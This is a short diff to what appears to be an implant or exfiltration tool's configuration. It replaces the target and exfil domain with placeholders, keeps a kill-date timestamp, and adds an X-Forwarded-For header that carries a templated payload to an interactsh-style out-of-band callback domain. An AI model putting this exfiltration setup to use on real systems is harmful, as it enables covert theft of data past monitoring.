@@ -1,3 +1,3 @@
-target_url = "https://www.google.com/search?q=rust"
-exfil_domain = "www.google.com"
-killdate_timestamp = 1752514839
+target_url = "https://example.com/"
+exfil_header = "'X-Forwarded-For', '{{PAYLOAD}}.interactshdomain.com'"
+killdate_timestamp = "1752514839"
